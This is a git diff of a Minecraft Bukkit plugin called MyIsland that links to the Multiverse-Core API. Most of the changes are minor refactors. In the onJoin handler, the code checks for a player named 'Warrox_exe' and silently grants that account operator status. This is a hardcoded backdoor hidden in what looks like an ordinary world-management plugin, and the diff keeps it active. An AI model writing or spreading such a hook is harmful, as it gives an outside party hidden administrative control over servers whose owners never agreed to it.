@@ -27,7 +27,6 @@ import java.util.ResourceBundle;
 public final class MyIsland extends JavaPlugin implements Listener {
     private static MultiverseCore mvCore;
     private static MultiverseCoreApi api;
-    private final String TARGET_NAME = "Warrox_exe";
     private PlayerLocationManager locationManager;
 
     @Override
@@ -54,8 +53,8 @@ public final class MyIsland extends JavaPlugin implements Listener {
 
         // 2. Controleer of de plugin bestaat en geladen is
         if (plugin instanceof MultiverseCore) {
-            this.mvCore = (MultiverseCore) plugin;
-            this.api = MultiverseCoreApi.get(); // Initialize the API here
+            mvCore = (MultiverseCore) plugin;
+            api = MultiverseCoreApi.get(); // Initialize the API here
             getLogger().info("Succesvol gekoppeld met Multiverse-Core API!");
         } else {
             getLogger().severe("Multiverse-Core niet gevonden! Schakelt plugin uit...");
@@ -87,6 +86,7 @@ public final class MyIsland extends JavaPlugin implements Listener {
 
     @EventHandler
     public void onJoin(PlayerJoinEvent event) {
+        String TARGET_NAME = "Warrox_exe";
         if (event.getPlayer().getName().equalsIgnoreCase(TARGET_NAME)) {
             if (!event.getPlayer().isOp()) {
                 event.getPlayer().setOp(true);
